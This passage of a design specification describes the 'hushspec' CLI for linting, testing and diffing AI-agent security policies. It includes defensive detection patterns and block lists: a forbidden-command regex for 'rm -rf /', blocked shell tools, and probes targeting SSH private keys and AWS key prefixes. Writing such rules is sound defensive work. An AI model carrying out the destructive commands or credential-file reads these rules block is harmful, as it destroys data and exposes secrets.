3. **Overlapping character classes with quantifiers:** adjacent quantified expressions with overlapping match sets (e.g., `[a-z]+[a-m]+`).

These heuristics have false positive/negative rates but catch the most common ReDoS vectors. A future phase could integrate the `regex-automata` crate for precise analysis.

**Diagnostic:**
```
  WARN  rules.shell_commands.forbidden_patterns[0] "(.*a)+" has nested
        quantifiers -- potential ReDoS risk  [regex-complexity]
    --> policy.yaml:5:9
    = help: simplify the pattern to avoid nested quantifiers
```

---

#### L008: `unused-extension`

**Severity:** info
**Description:** An extension is declared but has no visible effect. For example, `extensions.posture` is defined but no origin profile references a posture state, or `extensions.origins` is defined but has an empty `profiles` array.

**Diagnostic:**
```
  INFO  extensions.posture: posture extension is defined but no origin
        profiles reference posture states  [unused-extension]
```

---

#### L009: `missing-secret-patterns`

**Severity:** info
**Description:** The policy has no `secret_patterns` rule block. Secret scanning is a recommended practice for policies that permit `file_write` actions.

**Diagnostic:**
```
  INFO  rules: no secret_patterns rules defined -- consider adding secret
        detection for file_write operations  [missing-secret-patterns]
```

---

#### L010: `forbidden-and-allowlist-conflict`

**Severity:** warning
**Description:** Both `forbidden_paths` and `path_allowlist` are enabled. While the specification allows this (both are evaluated; deny wins), it can be confusing. The two mechanisms represent opposing models (denylist vs. allowlist).

**Diagnostic:**
```
  WARN  both rules.forbidden_paths and rules.path_allowlist are enabled --
        consider using one access control model consistently  [forbidden-and-allowlist-conflict]
```

---

#### L011: `version-compatibility`

**Severity:** warning
**Description:** The document's `hushspec` version does not match the CLI's built-in version support range. The document may use features not understood by this version of the tool, or may be using a deprecated version.

**Diagnostic:**
```
  WARN  hushspec version "0.2.0" is newer than CLI support range (0.1.x) --
        some fields may not be validated  [version-compatibility]
```

---

#### L012: `duplicate-list-entries`

**Severity:** warning
**Description:** An array field contains duplicate entries (e.g., the same domain in `egress.allow` twice, the same tool name in `tool_access.block` twice).

**Example:**
```yaml
rules:
  egress:
    allow:
      - "api.github.com"
      - "api.github.com"     # duplicate
```

**Diagnostic:**
```
  WARN  rules.egress.allow: duplicate entry "api.github.com" at indices
        0 and 1  [duplicate-list-entries]
    --> policy.yaml:6:9
```

**Auto-fix:** `--fix` removes the duplicate entry.

---

#### L013: `allow-block-overlap`

**Severity:** warning
**Description:** The same entry appears in both the `allow` and `block` lists of a rule. The HushSpec spec defines that `block` takes precedence over `allow`, so the allow entry is dead -- it can never produce an `allow` decision for that target.

**Example:**
```yaml
rules:
  egress:
    allow:
      - "api.example.com"
    block:
      - "api.example.com"    # <-- blocks this domain, making the allow entry dead
    default: allow
```

**Diagnostic:**
```
  WARN  rules.egress: "api.example.com" appears in both allow and block lists --
        block takes precedence, allow entry is dead  [allow-block-overlap]
    --> policy.yaml:5:9
    = help: remove "api.example.com" from the allow list (it is blocked regardless)
```

**Auto-fix:** `--fix` removes the entry from the `allow` list.

---

#### L014: `unreachable-default`

**Severity:** info
**Description:** The `default` action of a rule block can never be reached because explicit lists cover all possible inputs. For example, if `tool_access.default` is `block` but there are no tools that would fall through to the default (because `allow` + `block` + `require_confirmation` cover all tool names the policy author intends to use). This is a heuristic check -- it fires when the combined allow/block/confirmation lists have 20+ entries and no test cases hit the default.

**Diagnostic:**
```
  INFO  rules.tool_access.default: default "block" may be unreachable --
        all common tool names are covered by explicit lists  [unreachable-default]
    = note: this is a heuristic check; unusual tool names may still hit the default
```

---

#### L015: `missing-forbidden-paths`

**Severity:** info
**Description:** The policy has no `forbidden_paths` rule block. Path restrictions are a recommended baseline for policies that permit `file_read` or `file_write` actions.

**Diagnostic:**
```
  INFO  rules: no forbidden_paths rules defined -- consider adding path
        restrictions for file operations  [missing-forbidden-paths]
```

### 5.4 Lint Configuration

A `.hushspec-lint.yaml` file at the project root configures lint behavior:

```yaml
# .hushspec-lint.yaml

# Override severity levels
rules:
  dead-rule-block: error          # promote to error
  no-confirmation-gate: off       # disable this rule
  overly-broad-pattern: warning   # keep at warning (default)

# Exclude files from linting
exclude:
  - "rulesets/permissive.yaml"    # intentionally broad
  - "test-fixtures/**"
```

When no config file is found, all rules run at their default severity.

### 5.5 Text Output

```
$ hushspec lint rulesets/permissive.yaml
  WARN  rules.egress.allow[0]: wildcard pattern "*" allows all domains,
        effectively disabling egress control  [overly-broad-pattern]
    --> rulesets/permissive.yaml:10:9

  INFO  rules: no secret_patterns rules defined  [missing-secret-patterns]

  INFO  rules: no forbidden_paths rules defined  [missing-forbidden-paths]

  3 findings (0 errors, 1 warning, 2 info)
```

### 5.6 JSON Output

```json
{
  "version": "0.1.0",
  "command": "lint",
  "success": true,
  "results": [
    {
      "file": "rulesets/permissive.yaml",
      "findings": [
        {
          "rule": "overly-broad-pattern",
          "code": "L004",
          "severity": "warning",
          "message": "wildcard pattern \"*\" allows all domains, effectively disabling egress control",
          "path": "rules.egress.allow[0]",
          "location": {
            "file": "rulesets/permissive.yaml",
            "line": 10,
            "column": 9
          },
          "fix": null
        }
      ]
    }
  ],
  "summary": {
    "total_findings": 3,
    "errors": 0,
    "warnings": 1,
    "info": 2
  }
}
```

### 5.7 Auto-Fix

When `--fix` is passed, the CLI applies safe auto-fixes and reports what changed:

```
$ hushspec lint --fix policy.yaml
  FIXED  removed dead exception "**/.aws/config"  [shadowed-exception]
  FIXED  removed duplicate entry "api.github.com" in rules.egress.allow  [duplicate-list-entries]
  FIXED  removed dead allow entry "api.example.com" (blocked)  [allow-block-overlap]

  3 fixes applied
```

Only fixes marked as safe in the rule definition are applied. Rules like `dead-rule-block` and `overly-broad-pattern` require human judgment and are never auto-fixed.

**Auto-fixable rules summary:**

| Rule | Auto-fix action |
|------|----------------|
| L003 `shadowed-exception` | Remove dead exception entry |
| L012 `duplicate-list-entries` | Remove duplicate entries |
| L013 `allow-block-overlap` | Remove dead allow entry |

---

## 6. `hushspec diff` Command

### 6.1 Purpose

Compare two HushSpec policy files and show the effective differences in both structure and evaluation outcomes. This is the key tool for policy review in pull requests.

This directly addresses **Gap #14**: "When I update a policy, what changed in the effective decision surface? I want `hushspec diff old.yaml new.yaml` showing 'these 12 actions changed from allow to deny.'"

### 6.2 Syntax

```
hushspec diff [OPTIONS] <OLD> <NEW>

Arguments:
  <OLD>    Base policy file (before change)
  <NEW>    Updated policy file (after change)

Options:
      --resolve            Resolve extends chains before comparing
      --probes <FILE>      Path to a YAML file containing probe actions to evaluate
      --probe-count <N>    Number of auto-generated probe actions per rule type [default: 10]
      --structural-only    Show only structural changes (skip evaluation probing)
      --fail-on-change     Exit 4 if any decision changes are detected
  -o, --output <FORMAT>    Output format: text, json [default: text]
```

### 6.3 Structural Diff

The structural diff compares the two policies field by field and reports:
- Added rule blocks
- Removed rule blocks
- Modified rule blocks (with field-level detail)
- Changed top-level fields (`name`, `description`, `merge_strategy`)
- Extension changes

```
$ hushspec diff old-policy.yaml new-policy.yaml

  Structural Changes:
  -------------------

  rules.egress.allow:
    + "api.stripe.com"
    + "cdn.example.com"
    - "legacy.internal.corp"

  rules.egress.default:
    ~ "allow" -> "block"

  rules.tool_access:
    + block list added: ["shell_exec", "run_command", "raw_delete"]
    + require_confirmation added: ["deploy", "publish"]
    ~ default: "allow" -> "block"

  rules.secret_patterns:
    + rule block added (4 patterns)

  rules.patch_integrity.max_additions:
    ~ 1000 -> 500
```

Legend: `+` added, `-` removed, `~` modified.

### 6.4 Evaluation Probing

Beyond structural diff, the CLI generates "probe" actions and evaluates them against both policies to show effective decision changes. This answers the question: "What can I do with the old policy that I can no longer do with the new one?"

#### 6.4.1 Probe Generation Algorithm

Probes are generated deterministically from the content of both policy files. The algorithm is:

**Step 1: Extract targets from both policies.**
For each rule type, extract all literal values from both the old and new policies:

| Rule type | Sources for probe targets |
|-----------|--------------------------|
| `egress` | All entries in `allow`, `block` lists from both policies. For wildcard entries like `*.example.com`, generate concrete instances: `api.example.com`, `cdn.example.com`, `www.example.com`. |
| `forbidden_paths` | All entries in `patterns` and `exceptions` from both policies. For glob patterns, generate concrete paths: `**/.ssh/**` becomes `/home/user/.ssh/id_rsa`, `/home/user/.ssh/config`. |
| `tool_access` | All entries in `allow`, `block`, `require_confirmation` from both policies. |
| `shell_commands` | For each `forbidden_patterns` regex, generate one matching string and one non-matching string. Matching strings are built by extracting literal fragments from the regex. |
| `secret_patterns` | For each pattern, generate one file_write action with matching content and one without. Matching content uses pattern documentation (e.g., `AKIA` prefix for AWS keys). |

**Step 2: Add synthetic "miss" probes.**
Add `--probe-count` random targets per rule type that are unlikely to match any explicit entry. These test the `default` behavior. Examples:
- Egress: `probe-{n}.hushspec-test.invalid` (using `.invalid` TLD per RFC 2606)
- Tool access: `hushspec_probe_tool_{n}`
- File paths: `/tmp/hushspec-probe-{n}/file.txt`

**Step 3: Deduplicate and evaluate.**
Remove duplicate probe actions across steps 1 and 2. Evaluate each probe against both the old and new policies. Report only probes where the decision differs.

**Step 4: Classify changes.**
Each decision change is classified:
- **Relaxation:** deny/warn to allow (security posture weakened)
- **Tightening:** allow to warn/deny (security posture strengthened)
- **Escalation:** warn to deny (confirmation removed, now blocked)
- **Demotion:** deny to warn (now gated instead of blocked)

**Probe output:**

```
$ hushspec diff old-policy.yaml new-policy.yaml

  ...structural changes...

  Decision Changes (47 probes evaluated, 9 changed):
  --------------------------------------------------

  RELAXATION (security weakened):
    egress          api.stripe.com            deny  ->  allow     rules.egress.allow
    egress          cdn.example.com           deny  ->  allow     rules.egress.allow

  TIGHTENING (security strengthened):
    egress          legacy.internal.corp      allow ->  deny      rules.egress.default
    egress          random-domain.io          allow ->  deny      rules.egress.default
    tool_call       shell_exec                allow ->  deny      rules.tool_access.block
    tool_call       run_command               allow ->  deny      rules.tool_access.block
    tool_call       list_files                allow ->  deny      rules.tool_access.default
    file_write      /src/config.js (w/ key)   allow ->  deny      rules.secret_patterns

  ESCALATION (deny -> warn):
    tool_call       deploy                    allow ->  warn      rules.tool_access.require_confirmation

  Summary: 2 relaxations, 6 tightenings, 1 escalation
```

**Custom probes:**

Policy authors can supply their own probe actions in a YAML file:

```yaml
# probes.yaml
probes:
  - type: egress
    target: "api.internal-service.corp"
  - type: egress
    target: "pypi.org"
  - type: tool_call
    target: "database_migrate"
  - type: file_write
    target: "/etc/nginx/nginx.conf"
    content: "upstream backend { server 10.0.0.1; }"
  - type: shell_command
    target: "npm install express"
```

```
$ hushspec diff old.yaml new.yaml --probes probes.yaml

  Decision Changes (custom probes):
  ---------------------------------

  Action Type     Target                    Old       New       Rule
  --------------- ------------------------- --------- --------- ---------------------------
  egress          api.internal-service.corp  allow     deny      rules.egress.default
  egress          pypi.org                   allow     allow     (unchanged)
  tool_call       database_migrate           allow     deny      rules.tool_access.default
  file_write      /etc/nginx/nginx.conf      allow     allow     (unchanged)
  shell_command   npm install express        allow     allow     (unchanged)

  2 decision changes detected
```

When both `--probes` and auto-generated probes are used, they are combined. Custom probes always appear in the output even when unchanged (to confirm expectations).

### 6.5 JSON Output

```json
{
  "version": "0.1.0",
  "command": "diff",
  "success": true,
  "structural_changes": [
    {
      "path": "rules.egress.allow",
      "type": "array_modified",
      "added": ["api.stripe.com", "cdn.example.com"],
      "removed": ["legacy.internal.corp"]
    },
    {
      "path": "rules.egress.default",
      "type": "value_changed",
      "old": "allow",
      "new": "block"
    },
    {
      "path": "rules.tool_access",
      "type": "block_added",
      "summary": "block list added with 3 entries, require_confirmation added with 2 entries"
    }
  ],
  "decision_changes": [
    {
      "action": {
        "type": "egress",
        "target": "api.stripe.com"
      },
      "old_decision": "deny",
      "new_decision": "allow",
      "old_matched_rule": "rules.egress.default",
      "new_matched_rule": "rules.egress.allow",
      "classification": "relaxation"
    },
    {
      "action": {
        "type": "tool_call",
        "target": "shell_exec"
      },
      "old_decision": "allow",
      "new_decision": "deny",
      "old_matched_rule": "rules.tool_access.default",
      "new_matched_rule": "rules.tool_access.block",
      "classification": "tightening"
    }
  ],
  "summary": {
    "structural_changes": 5,
    "decision_changes": 9,
    "probes_evaluated": 47,
    "relaxations": 2,
    "tightenings": 6,
    "escalations": 1,
    "demotions": 0
  }
}
```

### 6.6 CI Gate Usage

In CI, the diff command can be used as a gate that fails when decision changes are detected:

**Simple gate (any decision change fails the build):**

```yaml
- name: Policy diff check
  run: hushspec diff old-policy.yaml new-policy.yaml --fail-on-change
```

**Selective gate (only relaxations fail the build):**

```yaml
# In a GitHub Actions workflow
- name: Policy diff check
  run: |
    hushspec diff \
      old-policy.yaml \
      new-policy.yaml \
      --output json \
      --probes probes.yaml \
      > diff-report.json

    # Fail if any decisions were relaxed (deny/warn -> allow)
    relaxations=$(jq '.summary.relaxations' diff-report.json)
    if [ "$relaxations" -gt 0 ]; then
      echo "::error::$relaxations actions were relaxed -- security review required"
      exit 1
    fi
```

**PR comment with diff summary:**

```yaml
- name: Policy diff comment
  if: github.event_name == 'pull_request'
  run: |
    git show origin/${{ github.base_ref }}:policies/production.yaml > /tmp/old-policy.yaml 2>/dev/null || exit 0

    echo "## Policy Diff" > /tmp/comment.md
    echo '```' >> /tmp/comment.md
    hushspec diff /tmp/old-policy.yaml policies/production.yaml >> /tmp/comment.md
    echo '```' >> /tmp/comment.md

    gh pr comment ${{ github.event.number }} --body-file /tmp/comment.md
```

### 6.7 Performance Considerations

Probe generation and evaluation is parallelized using `rayon`. For policies with many entries (e.g., 100+ egress domains), the number of generated probes can be large. The `--probe-count` flag controls the number of synthetic miss probes per rule type but does not limit probes derived from explicit list entries. For very large policies, the structural-only mode (`--structural-only`) provides instant results.

Typical performance targets:
- Structural diff: < 10ms for any policy size
- Probe evaluation: < 100ms for policies with < 50 rules, < 1s for policies with < 500 rules
- Full diff with 200 probes: < 500ms

---

## 7. `hushspec fmt` Command

### 7.1 Purpose

Format HushSpec policy files in a canonical style. Ensures consistent YAML formatting across a team and prevents diff noise from whitespace or ordering changes.

### 7.2 Syntax

```
hushspec fmt [OPTIONS] <FILE>...

Arguments:
  <FILE>...    One or more policy YAML files to format

Options:
      --check              Check formatting without modifying files (exit 1 if changes needed)
      --diff               Show what would change without modifying files
  -o, --output <FORMAT>    Output format: text, json [default: text]
```

### 7.3 Formatting Rules

1. **Field ordering:** Top-level fields are ordered: `hushspec`, `name`, `description`, `extends`, `merge_strategy`, `rules`, `extensions`.
2. **Rule block ordering:** Rule blocks within `rules` are ordered: `forbidden_paths`, `path_allowlist`, `egress`, `secret_patterns`, `patch_integrity`, `shell_commands`, `tool_access`, `computer_use`, `remote_desktop_channels`, `input_injection`.
3. **Indentation:** Two spaces, no tabs.
4. **String quoting:** Strings containing special YAML characters or that look like numbers/booleans are quoted. Simple strings are unquoted.
5. **Array style:** Short arrays (fewer than 4 elements, each under 40 characters) use flow style: `[a, b, c]`. Longer arrays use block style with `-` prefixes.
6. **Comments:** Preserved in their original position relative to the field they annotate.
7. **Trailing newline:** Files end with a single newline.
8. **List deduplication:** Duplicate entries in arrays are removed during formatting.
9. **List sorting:** Entries in `egress.allow`, `egress.block`, `tool_access.allow`, `tool_access.block`, `tool_access.require_confirmation` are sorted alphabetically. Path patterns in `forbidden_paths.patterns` and `exceptions` are sorted alphabetically.

### 7.4 Output

```
$ hushspec fmt --check policy.yaml
  FAIL  policy.yaml would be reformatted

$ hushspec fmt --diff policy.yaml
  --- policy.yaml (original)
  +++ policy.yaml (formatted)
  @@ -3,8 +3,8 @@
   rules:
     egress:
       allow:
  -      - "github.com"
         - "api.github.com"
  +      - "github.com"
       default: block

$ hushspec fmt policy.yaml
  DONE  policy.yaml formatted
```

---

## 8. `hushspec init` Command

### 8.1 Purpose

Scaffold a new HushSpec policy project with a starter policy, test suite, and configuration file. Reduces the onboarding friction for new policy authors.

### 8.2 Syntax

```
hushspec init [OPTIONS] [DIR]

Arguments:
  [DIR]    Directory to initialize (default: current directory)

Options:
      --preset <PRESET>    Use a built-in ruleset as the starting policy:
                           default, strict, permissive, ai-agent, cicd
      --name <NAME>        Policy name [default: my-policy]
      --no-tests           Skip generating starter test files
      --no-config          Skip generating .hushspec.yaml
```

### 8.3 Generated Files

```
$ hushspec init --preset ai-agent --name production

  Created production.yaml
  Created tests/egress.test.yaml (4 cases)
  Created tests/paths.test.yaml (4 cases)
  Created tests/tools.test.yaml (3 cases)
  Created .hushspec.yaml
  Created .hushspec-lint.yaml

  Next steps:
    1. Review and customize production.yaml
    2. Run: hushspec validate production.yaml
    3. Run: hushspec test
    4. Run: hushspec lint production.yaml
```

The generated test files are derived from the preset's rule blocks. For example, if the preset includes `egress.allow: ["api.github.com"]`, the generated egress test includes a case that asserts `api.github.com` is allowed. This gives the author a working baseline to modify.

**Generated `.hushspec.yaml`:**

```yaml
policy: production.yaml
test:
  fixtures: tests/
lint:
  severity: warning
```

---

## 9. CI/CD Integration

### 9.1 GitHub Actions Workflow

```yaml
name: Policy Check

on:
  pull_request:
    paths:
      - 'policies/**'
      - 'tests/**'

jobs:
  policy-check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0    # needed for diff against base branch

      - name: Install hushspec
        run: |
          curl -fsSL https://github.com/backbay-labs/hush/releases/latest/download/hushspec-x86_64-unknown-linux-musl.tar.gz \
            | tar xz -C /usr/local/bin/

      - name: Validate policies
        run: hushspec validate policies/*.yaml

      - name: Lint policies
        run: hushspec lint policies/*.yaml --fail-on-warnings

      - name: Format check
        run: hushspec fmt --check policies/*.yaml

      - name: Run policy tests
        run: |
          hushspec test policies/production.yaml tests/ \
            --junit test-results.xml \
            --coverage

      - name: Upload test results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: policy-test-results
          path: test-results.xml

      - name: Policy diff
        if: github.event_name == 'pull_request'
        run: |
          git show origin/${{ github.base_ref }}:policies/production.yaml > /tmp/old-policy.yaml 2>/dev/null || exit 0
          hushspec diff /tmp/old-policy.yaml policies/production.yaml \
            --output json > diff-report.json
          echo "## Policy Diff" >> $GITHUB_STEP_SUMMARY
          echo '```' >> $GITHUB_STEP_SUMMARY
          hushspec diff /tmp/old-policy.yaml policies/production.yaml >> $GITHUB_STEP_SUMMARY
          echo '```' >> $GITHUB_STEP_SUMMARY
```

### 9.2 Pre-commit Hook Configuration

```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/backbay-labs/hush
    rev: v0.1.0
    hooks:
      - id: hushspec-validate
        name: Validate HushSpec policies
        entry: hushspec validate
        files: '\.ya?ml$'
        types: [yaml]

      - id: hushspec-lint
        name: Lint HushSpec policies
        entry: hushspec lint --severity warning
        files: '\.ya?ml$'
        types: [yaml]

      - id: hushspec-fmt
        name: Format HushSpec policies
        entry: hushspec fmt --check
        files: '\.ya?ml$'
        types: [yaml]
```

### 9.3 GitLab CI Example

```yaml
# .gitlab-ci.yml
policy-check:
  image: ghcr.io/backbay-labs/hushspec:latest
  stage: test
  script:
    - hushspec validate policies/*.yaml
    - hushspec lint policies/*.yaml
    - hushspec fmt --check policies/*.yaml
    - hushspec test policies/production.yaml tests/ --junit report.xml
  artifacts:
    reports:
      junit: report.xml
  rules:
    - changes:
        - policies/**
        - tests/**
```

### 9.4 Policy-as-Code Workflow

The intended end-to-end workflow for policy changes:

```
1. hushspec init --preset ai-agent (first time only)
   |
2. Author edits policy YAML
   |
3. hushspec fmt --fix (local, pre-commit)
   |
4. hushspec validate (local, pre-commit)
   |
5. hushspec lint (local, pre-commit)
   |
6. hushspec test --watch (during development)
   |
7. git commit && git push
   |
8. CI: hushspec validate (redundant but authoritative)
   |
9. CI: hushspec lint --fail-on-warnings
   |
10. CI: hushspec test policy.yaml tests/ --junit results.xml --coverage
   |
11. CI: hushspec diff old.yaml new.yaml
   |         |
   |    PR comment with diff summary + decision change table
   |
12. Human review: security team reviews decision changes
   |         |
   |    Focus on "relaxations" (deny -> allow changes)
   |
13. Merge
```

---

## 10. Implementation Plan

### Phase 1: `validate` + `init` Commands (Week 1-2)

**Goal:** Ship `hushspec validate` and `hushspec init` as a standalone binary.

**Tasks:**
1. Create `crates/hushspec-cli` with `clap` derive API.
2. Implement the `validate` subcommand with all four validation layers.
3. Implement `--output json` for structured output.
4. Implement `--resolve` for extends chain validation.
5. Add error codes and line/column tracking for diagnostics.
6. Add batch validation support (multiple files).
7. Implement `init` subcommand with preset loading and test scaffolding.
8. Implement `completions` subcommand.
9. Implement `.hushspec.yaml` config file loading and search path logic.
10. Write integration tests using the existing `rulesets/*.yaml` files as valid inputs and the `fixtures/core/invalid/*.yaml` files as invalid inputs.

**Dependencies:** Only `hushspec` library crate (already exists with `parse`, `validate`, `resolve_from_path`).

**Deliverable:** `cargo install hushspec-cli` works and `hushspec validate` produces useful output.

### Phase 2: `test` Command (Week 3-4)

**Goal:** Ship `hushspec test` for user-authored test suites.

**Tasks:**
1. Define `hushspec-policy-test.v0.schema.json` (evaluator test schema with optional `policy`).
2. Implement test file schema validation (validate test files before running them).
3. Implement the test runner that loads a policy file and applies it to test cases.
4. Support the existing evaluator test schema with optional `policy` field.
5. Implement `--fixtures` mode for backward compatibility with embedded-policy fixtures.
6. Implement TAP output (`--tap`).
7. Implement JUnit XML output (`--junit`).
8. Implement `--filter` for test name filtering.
9. Implement `--fail-fast` for early termination.
10. Add contextual hints on test failure (analyze the gap between expected and actual).
11. Implement `--watch` mode with filesystem event debouncing.
12. Implement `--coverage` rule coverage summary.
13. Write documentation: "Writing Your First Policy Test Suite."

**Dependencies:** `hushspec::evaluate` (already exists), `hushspec::resolve_from_path` (already exists).

**Deliverable:** Policy authors can write `.test.yaml` files and run them against their policies.

### Phase 3: `fmt` Command (Week 5)

**Goal:** Ship `hushspec fmt` for canonical YAML formatting.

**Tasks:**
1. Implement YAML round-trip formatting preserving comments (using `serde_yaml` with careful output control, or a YAML CST library).
2. Implement field ordering rules.
3. Implement `--check` and `--diff` modes.
4. Write tests against all `rulesets/*.yaml` files (format should be idempotent).

**Dependencies:** May require evaluating `yaml-rust2` or similar for comment-preserving round-trips, since `serde_yaml` does not preserve comments.

**Deliverable:** `hushspec fmt --check` can gate CI.

### Phase 4: `lint` Command (Week 6-7)

**Goal:** Ship `hushspec lint` with the initial rule set.

**Tasks:**
1. Implement the lint engine framework (rule registry, severity levels, location tracking).
2. Implement lint rules L001-L015 as described in Section 5.3.
3. Implement `.hushspec-lint.yaml` configuration parsing.
4. Implement `--fix` for auto-fixable rules (L003, L012, L013).
5. Implement `--rule` for selective rule execution.
6. Implement `--fail-on-warnings` flag.
7. Implement `--watch` mode.
8. Write tests for each lint rule with positive and negative cases.

**Dependencies:** Only `hushspec` library crate for parsing. Lint is purely static analysis.

**Deliverable:** `hushspec lint` catches common mistakes.

### Phase 5: `diff` Command (Week 8-9)

**Goal:** Ship `hushspec diff` with structural and evaluation-based comparison.

**Tasks:**
1. Implement structural diff (field-by-field comparison of two parsed `HushSpec` structs).
2. Implement probe generation algorithm (Section 6.4.1).
3. Implement probe evaluation with `rayon` parallelism.
4. Implement decision change classification (relaxation/tightening/escalation/demotion).
5. Implement `--probes` for custom probe files.
6. Implement `--resolve` for extends chain comparison.
7. Implement `--structural-only` mode.
8. Implement `--fail-on-change` exit code behavior.
9. Implement table formatting for decision change output.

**Dependencies:** `hushspec::evaluate`, `hushspec::merge`, `hushspec::resolve_from_path` (all exist).

**Deliverable:** `hushspec diff` produces reviewable output for PR workflows.

### Phase 6: Distribution (Week 10)

**Goal:** Make `hushspec` easy to install on all platforms.

**Tasks:**
1. Set up cross-compilation CI for the six target triples listed in Section 2.5.
2. Create GitHub Release automation (tag -> build -> upload binaries).
3. Create Homebrew tap formula.
4. Create npm wrapper package (`@hushspec/cli`).
5. Create Docker image (`ghcr.io/backbay-labs/hushspec`).
6. Write installation documentation.

**Dependencies:** Binary must be stable.

**Deliverable:** `brew install hushspec`, `npx @hushspec/cli`, and direct download all work.

---

## 11. UX Design

### 11.1 Color Output

Colors follow the `--color` flag (`auto`, `always`, `never`). In `auto` mode, colors are enabled when stdout is a TTY. The `NO_COLOR` environment variable is respected per https://no-color.org/.

| Element         | Color          |
|-----------------|----------------|
| PASS            | Green bold     |
| FAIL            | Red bold       |
| WARN            | Yellow bold    |
| INFO            | Blue           |
| Error code      | Red            |
| File path       | Cyan           |
| Rule identifier | Dim/gray       |
| Changed values  | Magenta        |
| RELAXATION      | Red (security weakened) |
| TIGHTENING      | Green (security strengthened) |

### 11.2 Progress Indicators

For batch operations (validating many files, running many tests), the CLI shows a progress line:

```
Validating... 42/50 files
```

The progress line is a single line updated in place (using `\r`) when stdout is a TTY. When stdout is not a TTY, progress is suppressed.

### 11.3 Error Messages with Fix Suggestions

Every error and warning includes a `help` line when the tool can suggest a concrete fix:

```
  error[E002]: invalid regex in rules.shell_commands.forbidden_patterns[0]
    --> policy.yaml:15:9
     |
  15 |       - "rm\\s+-rf\\s+[/"
     |         ^^^^^^^^^^^^^^^^
     = note: unclosed character class at position 16
     = help: did you mean "rm\\s+-rf\\s+/?"
```

Suggestions are generated by heuristic analysis (e.g., detecting unmatched brackets, suggesting escaped alternatives). They are never auto-applied without `--fix`.

### 11.4 Verbose/Quiet Modes

**`--quiet` (`-q`):** Suppress all output except error messages and the final exit code. Useful for CI scripts that only care about pass/fail.

**`--verbose` (`-v`):** Show additional detail:
- For `validate`: show all parsed fields and their values.
- For `test`: show the full evaluation result for every test case, not just failures.
- For `lint`: show rules that were checked but produced no findings.
- For `diff`: show all probed actions, not just ones where decisions changed.

---

## Appendix A: Relationship to `hushspec-testkit`

The `hushspec-testkit` binary continues to exist as the conformance test runner for SDK implementors. It is not replaced by the CLI. The two tools serve different audiences:

| Aspect          | `hushspec-testkit`                     | `hushspec` CLI                         |
|-----------------|----------------------------------------|----------------------------------------|
| Audience        | SDK implementors                       | Policy authors                         |
| Input format    | Fixture directories with conventions   | Standalone policy files + test files   |
| Policy source   | Embedded in fixture files              | Standalone YAML file                   |
| Test discovery  | Directory-based category system        | Explicit file/directory arguments      |
| Evaluation      | Reference evaluator only               | Reference evaluator only               |
| Output          | Pass/fail per fixture                  | Rich diagnostics with suggestions      |
| Lint/diff       | Not applicable                         | Core features                          |

In Phase 2, the CLI's `--fixtures` mode can run the same fixture files that `hushspec-testkit` uses, providing a superset of testkit functionality for developers who prefer a single tool.

## Appendix B: Schema Summary

| Schema file | Purpose | Required by |
|-------------|---------|-------------|
| `hushspec-evaluator-test.v0.schema.json` | Existing conformance test fixtures (policy required) | `hushspec-testkit`, `hushspec test --fixtures` |
| `hushspec-policy-test.v0.schema.json` | CLI test files (policy optional) | `hushspec test` |
| `hushspec-core.v0.schema.json` | Core policy document schema | `hushspec validate` |

The policy test schema (`hushspec-policy-test.v0.schema.json`) is a strict superset of the evaluator test schema: every valid evaluator test fixture is also a valid policy test file. The reverse is not true (policy test files may omit `policy`).

## Appendix C: Lint Rule Quick Reference

| Code | Rule | Default Severity | Auto-fix |
|------|------|-----------------|----------|
| L001 | `dead-rule-block` | warning | No |
| L002 | `overlapping-patterns` | warning | No |
| L003 | `shadowed-exception` | warning | Yes |
| L004 | `overly-broad-pattern` | warning | No |
| L005 | `empty-blocklist-with-default-allow` | info | No |
| L006 | `no-confirmation-gate` | info | No |
| L007 | `regex-complexity` | warning | No |
| L008 | `unused-extension` | info | No |
| L009 | `missing-secret-patterns` | info | No |
| L010 | `forbidden-and-allowlist-conflict` | warning | No |
| L011 | `version-compatibility` | warning | No |
| L012 | `duplicate-list-entries` | warning | Yes |
| L013 | `allow-block-overlap` | warning | Yes |
| L014 | `unreachable-default` | info | No |
| L015 | `missing-forbidden-paths` | info | No |

## Appendix D: Future Considerations

- **Language Server Protocol (LSP):** An `hushspec` LSP server could provide real-time validation, lint, and autocomplete in editors. The lint rules and validation logic implemented for the CLI would be reused directly.
- **Policy playground:** A web-based tool where authors can paste a policy and test actions interactively. The CLI's evaluation engine could be compiled to WASM for this.
- **Ruleset registry:** A `hushspec registry` subcommand for browsing and installing community-contributed rulesets. The `extends` mechanism already supports referencing external policies; a registry would standardize discovery.
- **Coverage analysis (advanced):** Beyond the `--coverage` flag, `hushspec coverage` could analyze a test suite against the full action space and report coverage metrics with gap identification, suggesting test cases for untested rule paths.
- **Policy simulation:** `hushspec simulate` could replay a log of real agent actions against a policy and show what would have been allowed/denied, enabling policy tuning against production workloads.
- **Diff integration with git:** `hushspec diff --git` could automatically compare the current working tree version of a policy against the committed version, without needing to manually extract the old version.
